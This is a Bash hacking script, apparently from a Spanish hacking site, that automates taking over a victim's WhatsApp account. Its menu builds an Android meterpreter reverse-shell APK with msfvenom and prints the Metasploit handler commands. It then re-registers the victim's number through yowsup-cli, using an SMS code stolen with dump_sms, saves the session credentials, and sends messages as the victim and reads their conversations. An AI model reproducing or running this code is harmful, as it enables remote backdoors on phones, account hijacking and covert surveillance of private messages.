#!/bin/bash

# Visita nuestra página: www.mundohackers.es

#Colours
greenColour="\e[0;32m\033[1m"
endColour="\033[0m\e[0m"
redColour="\e[0;31m\033[1m"
blueColour="\e[0;34m\033[1m"
yellowColour="\e[0;33m\033[1m"
purpleColour="\e[0;35m\033[1m"
turquoiseColour="\e[0;36m\033[1m"
grayColour="\e[0;37m\033[1m"

if [ "$(id -u)" = "0" ]; then
	sleep 2
	clear
	echo -e -n "$blueColour-> Do you want to install FatRat for the creation of BackDoor? $endColour$redColour <Y/N>$endColour: "
	read respuesta
	echo " "

	if [ "$respuesta" = "Y" ]; then
		cd
		git clone https://github.com/Screetsec/TheFatRat
		echo -e "$blueColour\n-> Repository cloning correctly...$endColour"
		echo -e "$blueColour\n-> To install the tools required to apply for:$endColour"
		echo -e "\nchmod +x setup.h && chmod +x fatrat && chmod +x powerfull.sh && ./setup.sh"
		read respuesta
	fi

	echo -e -n "$blueColour-> Do you want to install the Yowsup library?$endColour$redColour <Y/N>$endColour: "
	read respuesta
	echo " "

	if [ "$respuesta" = "Y" ]; then
		cd
		git clone https://github.com/tgalal/yowsup
		echo " "
	fi

	echo -e "$blueColour-> Loading menu .....$endColour"
	sleep 3

	while true
		do
			clear
			echo -e "$yellowColour ╭━╮╱╱╱╱╱╱╭╮╱╱╭┳━┳┳━━╮$endColour"
			sleep 0.4
			echo -e "$yellowColour ┃╋┣━┳━━┳━┫╰┳━┫┃┃┃┃╭╮┃$endColour"
			sleep 0.4
			echo -e "$yellowColour ┃╮┫┻┫┃┃┃╋┃╭┫┻┫┃┃┃┃┣┫┃$endColour"
			sleep 0.4
			echo -e "$yellowColour ╰┻┻━┻┻┻┻━┻━┻━┻━┻━┻╯╰╯$endColour"
			sleep 0.8
			echo -e "$blueColour ---------------------$endColour"
			echo -e "$yellowColour 1. Create BackDoor$endColour"
			echo -e "$yellowColour 2. Get WhatsApp$endColour"
			echo -e "$yellowColour 3. Send Message From WhatsApp Victim$endColour"
			echo -e "$yellowColour 4. Sniff WhatsApp Conversations$endColour"
			echo -e "$yellowColour 5. Remove 'whatsapp_config.txt' actual"
			echo -e "$redColour 0. Exit$endColour"
			echo -e "$blueColour ---------------------$endColour"
			echo -e -n "$redColour-> Select an option : $endColour"
			read respuesta

			if [ "$respuesta" = "1" ]; then
				echo -e -n "\n$yellowColour-> Host: $endColour"
				read ip
				echo -e -n "\n$yellowColour-> Port: $endColour"
				read puerto
				echo -e -n "\n$yellowColour-> Name of the program: $endColour"
				read nombre_programa
				echo " "

				sudo msfvenom -p android/meterpreter/reverse_tcp lhost=$ip lport=$puerto R > ~/Escritorio/$nombre_programa.apk

				echo -e "$blueColourProgram created successfully on the Desktop$endColour"
				echo -e "$yellowColour\nNow from metasploit apply the following commands:$endColour"
				echo -e "$grayColour\n- use exploit/multi/handler$endColour"
				echo -e "$grayColour- set payload android/meterpreter/reverse_tcp$endColour"
				echo -e "$grayColour- set lhost $ip$endColour"
				echo -e "$grayColour- set lport $puerto$endColour"
				echo -e "$grayColour- exploit$endColour"
				echo -e "$redColour\nPress <Enter> to continue...$endColour"
				read

			elif [ "$respuesta" = "2" ]; then
				echo -e -n "\n$yellowColour-> International telephone prefix (ej: 34):$endColour "
				read cc
				echo -e -n "\n-$yellowColour> Phone number (ej: 682213452):$endColour "
				read phone
				echo -e -n "\n$yellowColour-> Select the option that matches the phone number :$endColour\n"
				sleep 2
				echo " "
				echo -e "$redColour.1.$endColour$blueColour  Operator: Vodafone Spain | Brand: Vodafone$endColour"
				echo -e "$redColour.2.$endColour$blueColour  Operator: France Telecom Spain SA | Brand: Orange$endColour"
				echo -e "$redColour.3.$endColour$blueColour  Operator: Xfera Moviles SA | Brand: Yoigo$endColour"
				echo -e "$redColour.4.$endColour$blueColour  Operator: Telefónica Moviles Spain | Brand: Movistar$endColour"
				echo -e "$redColour.5.$endColour$blueColour  Operator: Vodafone Spain | Brand: Vodafone$endColour"
				echo -e "$redColour.6.$endColour$blueColour  Operator: -- | Brand: Euskatel$endColour"
				echo -e "$redColour.7.$endColour$blueColour  Operator: France Telecom Spain SA | Brand: Orange$endColour"
				echo -e "$redColour.8.$endColour$blueColour  Operator: -- | Brand: Operadora de Telecomunicaciones Opera SL$endColour"
				echo -e "$redColour.9.$endColour$blueColour  Operator: France Telecom Spain SA | Brand: Orange$endColour"
				echo -e "$redColour.10.$endColour$blueColour Operator: BT Group Espana Comapia de Servicios | Brand: BT$endColour"
				echo -e "$redColour.11.$endColour$blueColour Operator: Telecable de Asturias S.A.U. | Brand: TeleCable$endColour"
				echo -e "$redColour.12.$endColour$blueColour Operator: Mobil R | Brand: R Cable y Telecomunicaciones Galicia S.A. SL$endColour"
				echo -e "$redColour.13.$endColour$blueColour Operator: Cableuropa S.A.U. | Brand: ONO$endColour"
				echo -e "$redColour.14.$endColour$blueColour Operator: Orange S.A. | Brand: Jazztel$endColour"
				echo " "
				echo -e -n "$yellowColour>$endColour "
				read opcion

				if [ "$opcion" = "1" ]; then
					mcc=214
					mnc=01
				elif [ "$opcion" = "2" ]; then
					mcc=214
					mnc=03
				elif [ "$opcion" = "3" ]; then
					mcc=214
					mnc=04
				elif [ "$opcion" = "4" ]; then
					mcc=214
					mnc=05
				elif [ "$opcion" = "5" ]; then
					mcc=214
					mnc=06
				elif [ "$opcion" = "6" ]; then
					mcc=214
					mnc=08
				elif [ "$opcion" = "7" ]; then
					mcc=214
					mnc=09
				elif [ "$opcion" = "8" ]; then
					mcc=214
					mnc=10
				elif [ "$opcion" = "9" ]; then
					mcc=214
					mnc=11
				elif [ "$opcion" = "10" ]; then
					mcc=214
					mnc=15
				elif [ "$opcion" = "11" ]; then
					mcc=214
					mnc=16
				elif [ "$opcion" = "12" ]; then
					mcc=214
					mnc=17
				elif [ "$opcion" = "13" ]; then
					mcc=214
					mnc=18
				elif [ "$opcion" = "14" ]; then
					mcc=214
					mnc=21
				fi

				echo -e "$yellowColour\n-> Registered securities cc=$cc | mcc=$mcc | mnc=$mnc | phone=$phone$endColour"
				sleep 3
				echo -e "$yellowColour\n-> Sending WhatsApp registration code...$endColour"
				echo " "
				sleep 3

				sudo yowsup-cli registration --requestcode sms --phone $cc$phone --cc $cc --mcc $mcc --mnc $mnc -E android

				echo -e -n "\n$yellowColour-> Since metasploit applies the command dump_sms once the session has been won | Code (not: 465-798):$endColour "
				read codigo_registro
				echo " "
				echo -e "$yellowColour-> Making registration...$endColour\n"
				sleep 2

				sudo yowsup-cli registration --register $codigo_registro --phone $cc$phone --cc $cc -E android

				echo -e -n "\n$yellowColour-> Enter the generated pw :$endColour "
				read password

				echo -e -n "\n$yellowColour-> Details of the WhatsApp session:$endColour\n"
				echo " "
				echo -e "$blueColour-------------------------------------$endColour"
				echo -e "$yellowColour cc=$cc$endColour"
				echo -e "$yellowColour phone=$phone"
				echo -e "$yellowColour password=$password"
				echo -e "$blueColour-------------------------------------$endColour"
				echo "cc=$cc" >> whatsapp_config.txt
				echo "phone=$cc$phone" >> whatsapp_config.txt
				echo "password=$password" >> whatsapp_config.txt
				echo -e "$blueColour\nThe file 'whatsapp_config.txt in the current directory has been generated$endColour"
				echo -e "$redColour\nPress <Enter> to continue...$endColour"
				read

			elif [ "$respuesta" = "3" ]; then
				echo -e -n "\n$yellowColour-> International prefix (to whom we want to send the message):$endColour "
				read prefijo_envio
				echo -e -n "\n$yellowColour-> Telephone number (To whom we want to send the message):$endColour "
				read numero_envio
				echo -e -n "\n$yellowColour-> Message to send:$endColour "
				read -e mensaje
				echo " "

				sudo yowsup-cli demos --config whatsapp_config.txt --send $prefijo_envio$numero_envio "$mensaje"

				echo -e "$redColour\nPress <Enter> to continue...$endColour"
				read

			elif [ "$respuesta" = "4" ]; then
				echo -e "\n$blueColour-> Sniffing conversations...$endColour\n"

				sudo yowsup-cli demos --config whatsapp_config.txt --echo

			elif [ "$respuesta" = "5" ]; then
				sudo rm -r whatsapp_config.txt

			elif [ "$respuesta" = "0" ]; then
				echo " "
				break
			fi
	done

else
	echo -e "\n$redColour-> You must as superuser$endColour\n"
fi
